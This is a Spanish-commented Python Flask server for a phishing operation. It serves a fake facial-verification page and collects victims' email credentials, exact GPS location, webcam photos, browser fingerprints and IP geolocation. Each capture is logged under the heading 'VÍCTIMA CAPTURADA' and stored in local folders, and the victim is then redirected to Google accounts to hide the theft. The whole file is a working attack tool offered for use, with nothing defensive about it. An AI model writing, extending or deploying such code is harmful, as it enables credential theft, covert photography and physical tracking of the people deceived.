from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import json
import os
import base64
from datetime import datetime
from threading import Lock

app = Flask(__name__)
CORS(app)  # Permitir cross-origin para técnicas avanzadas

# Configuración
DATA_DIR = "capturas"
os.makedirs(f"{DATA_DIR}/fotos", exist_ok=True)
os.makedirs(f"{DATA_DIR}/datos", exist_ok=True)
os.makedirs(f"{DATA_DIR}/ips", exist_ok=True)

lock = Lock()

def get_detailed_ip_info(ip):
    """Obtiene información exhaustiva de la IP"""
    try:
        # IP-API (gratuita)
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=66842623", timeout=5)
        data = response.json()
        
        # IPGeolocation (más detalles)
        # Si tienes API key: requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey=TU_KEY&ip={ip}")
        
        return {
            'ip': ip,
            'pais': data.get('country', 'N/A'),
            'codigo_pais': data.get('countryCode', 'N/A'),
            'region': data.get('regionName', 'N/A'),
            'ciudad': data.get('city', 'N/A'),
            'codigo_postal': data.get('zip', 'N/A'),
            'lat': data.get('lat', 'N/A'),
            'lon': data.get('lon', 'N/A'),
            'timezone': data.get('timezone', 'N/A'),
            'isp': data.get('isp', 'N/A'),
            'organizacion': data.get('org', 'N/A'),
            'as': data.get('as', 'N/A'),
            'proxy': data.get('proxy', False),
            'hosting': data.get('hosting', False),
            'mobile': data.get('mobile', False)
        }
    except Exception as e:
        return {'ip': ip, 'error': str(e)}

def save_photo(image_data, session_id):
    """Guarda la foto capturada de la cámara"""
    try:
        # Decodificar base64
        image_data = image_data.split(',')[1]  # Remover header "data:image/jpeg;base64,"
        image_bytes = base64.b64decode(image_data)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{DATA_DIR}/fotos/{session_id}_{timestamp}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(image_bytes)
        
        return filename
    except Exception as e:
        return f"Error: {e}"

def log_victim(data, ip_info):
    """Logging avanzado con colores ANSI"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    output = f"""
{'='*80}
\033[91m[🔴 VÍCTIMA CAPTURADA] {timestamp}\033[0m
{'='*80}

\033[93m📧 CREDENCIALES:\033[0m
   Usuario: {data.get('email', 'N/A')}
   Password: {data.get('password', 'N/A')}

\033[93m🌍 GEOLOCALIZACIÓN IP (Aproximada):\033[0m
   IP: {ip_info.get('ip', 'N/A')}
   País: {ip_info.get('pais', 'N/A')} ({ip_info.get('codigo_pais', 'N/A')})
   Ciudad: {ip_info.get('ciudad', 'N/A')}, {ip_info.get('region', 'N/A')}
   CP: {ip_info.get('codigo_postal', 'N/A')}
   ISP: {ip_info.get('isp', 'N/A')}
   Org: {ip_info.get('organizacion', 'N/A')}
   Proxy: {'Sí 🔴' if ip_info.get('proxy') else 'No 🟢'}
   Hosting: {'Sí 🔴' if ip_info.get('hosting') else 'No 🟢'}

\033[93m📍 GPS EXACTO (Navegador):\033[0m"""
    
    if data.get('gps'):
        gps = data['gps']
        output += f"""
   Latitud: {gps.get('latitude', 'N/A')}
   Longitud: {gps.get('longitude', 'N/A')}
   Precisión: ±{gps.get('accuracy', 'N/A')} metros
   Altitud: {gps.get('altitude', 'N/A')}
   Dirección: {gps.get('heading', 'N/A')}°
   Velocidad: {gps.get('speed', 'N/A')} m/s
   \033[92m🗺️  Google Maps: https://www.google.com/maps?q={gps.get('latitude')},{gps.get('longitude')}\033[0m"""
    else:
        output += "\n   \033[91mNo disponible (usuario rechazó permiso)\033[0m"

    output += f"""

\033[93m💻 INFORMACIÓN DEL SISTEMA:\033[0m
   User-Agent: {data.get('userAgent', 'N/A')}
   Plataforma: {data.get('platform', 'N/A')}
   Núcleos CPU: {data.get('hardwareConcurrency', 'N/A')}
   Memoria RAM: {data.get('deviceMemory', 'N/A')} GB
   Resolución: {data.get('screenResolution', 'N/A')}
   Profundidad color: {data.get('colorDepth', 'N/A')} bits
   Touch: {'Sí' if data.get('touchSupport') else 'No'}
   Idiomas: {data.get('languages', 'N/A')}
   Timezone: {data.get('timezone', 'N/A')}
   Canvas FP: {data.get('canvasFingerprint', 'N/A')[:50]}...

\033[93m🔌 RED Y BATERÍA:\033[0m"""
    
    if data.get('connection'):
        conn = data['connection']
        output += f"""
   Tipo: {conn.get('effectiveType', 'N/A')}
   Downlink: {conn.get('downlink', 'N/A')} Mbps
   RTT: {conn.get('rtt', 'N/A')} ms
   Ahorro datos: {'Sí' if conn.get('saveData') else 'No'}"""
    
    if data.get('battery'):
        batt = data['battery']
        output += f"""
   Batería: {batt.get('level', 'N/A')}%
   Cargando: {'Sí' if batt.get('charging') else 'No'}
   Tiempo restante: {batt.get('chargingTime', 'N/A')}s"""

    output += f"""

\033[93m📷 CÁMARA:\033[0m"""
    
    if data.get('photoSaved'):
        output += f"\n   \033[92m✓ FOTO CAPTURADA: {data.get('photoSaved')}\033[0m"
    else:
        output += "\n   \033[91m✗ No se pudo capturar foto\033[0m"

    output += f"""

\033[93m🔗 REFERENCIAS:\033[0m
   URL: {data.get('currentUrl', 'N/A')}
   Referrer: {data.get('referrer', 'N/A')}
   Historial length: {data.get('historyLength', 'N/A')}

{'='*80}
"""
    
    print(output)
    
    # Guardar JSON completo
    session_id = data.get('sessionId', 'unknown')
    with open(f"{DATA_DIR}/datos/{session_id}.json", 'w', encoding='utf-8') as f:
        json.dump({**data, 'ip_info': ip_info, 'timestamp': timestamp}, f, indent=2)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/verify')
def verify():
    """Página falsa de verificación facial que pide permiso de cámara"""
    return render_template('verify.html')

@app.route('/api/capture', methods=['POST'])
def capture():
    """Endpoint para recibir todos los datos"""
    data = request.json
    
    # Obtener IP real
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    
    # Información de IP
    ip_info = get_detailed_ip_info(ip)
    
    # Guardar foto si viene
    if data.get('photoData'):
        photo_path = save_photo(data['photoData'], data.get('sessionId', 'unknown'))
        data['photoSaved'] = photo_path
    
    # Loggear todo
    with lock:
        log_victim(data, ip_info)
    
    return jsonify({'status': 'success', 'redirect': 'https://accounts.google.com'})

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)
  
if __name__ == '__main__':
    print("\033[96m" + "="*80 + "\033[0m")
    print("\033[96m[*] Servidor Avanzado Iniciado\033[0m")
    print("\033[96m[*] URL: http://localhost:5000\033[0m")
    print("\033[96m[*] Datos guardados en: ./capturas/\033[0m")
    print("\033[96m" + "="*80 + "\033[0m\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)